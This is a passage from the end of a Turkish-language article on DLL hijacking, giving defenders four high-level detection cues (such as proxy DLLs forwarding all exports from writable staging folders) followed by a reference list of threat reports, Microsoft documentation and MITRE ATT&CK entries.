Savunma odakları
- `version.dll` veya benzeri yaygın kitaplıkları `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı işlemler.
- Görüntü yüklendikten kısa süre sonra işlem giriş noktasında yapılan bellek yamaları; özellikle `Sleep`/`SleepEx` işlevlerine yönlendirilen jump/call talimatları.
- Bir proxy DLL tarafından oluşturulup şifresi çözülmüş bir ada sahip ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran iş parçacıkları.
- `ProgramData`, `%TEMP%` veya açılmış arşiv yolları gibi yazılabilir hazırlık dizinlerinde, üreticiye ait yürütülebilir dosyaların yanına yerleştirilmiş tüm export'ları yönlendiren proxy DLL'ler.

## References

- [1] [Red Canary – İstihbarat Öngörüleri: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit bir C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Avrupa'yı Hedefleyen Yeni Kötü Amaçlı Yazılımları Devreye Sokuyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Yardımcılarıyla Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dijital İkizler: Gh0st RAT Dağıtan Gelişen Kimliğe Bürünme Kampanyalarının Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Çıkarların Kesişmesi: Güneydoğu Asya'daki Bir Hükümeti Hedefleyen Tehdit Kümelerinin Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon'un İç Yüzü: Gizli Bir Saldırı Operasyonunun Aktarım Ağını ve İşleyişini Ortaya Çıkarma](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom araç setine yakından bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – İranlı APT Screening Serpens'in 2026 Casusluk Kampanyalarının İzini Sürme](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Hızlı ve Öfkeli: İran Çatışması Sırasında Nimbus Manticore Operasyonları](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Görev Eylemleri](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya Hükümetlerini ve Kritik Altyapıyı Hedef Alıyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0 ile Windows DLL Arama Sırası Hijacking'ini Yeniden Oluşturma ve Tespit Etme](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOT ile yerel kitaplıklar oluşturma](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOT ile native export'lar](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Dinamik bağlantı kitaplığı arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE biçimi](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Meşru Yazılıma Gömülü SectopRAT Varyantının Ortaya Çıkarılması](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW'u Çalmak (Birinci Bölüm)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
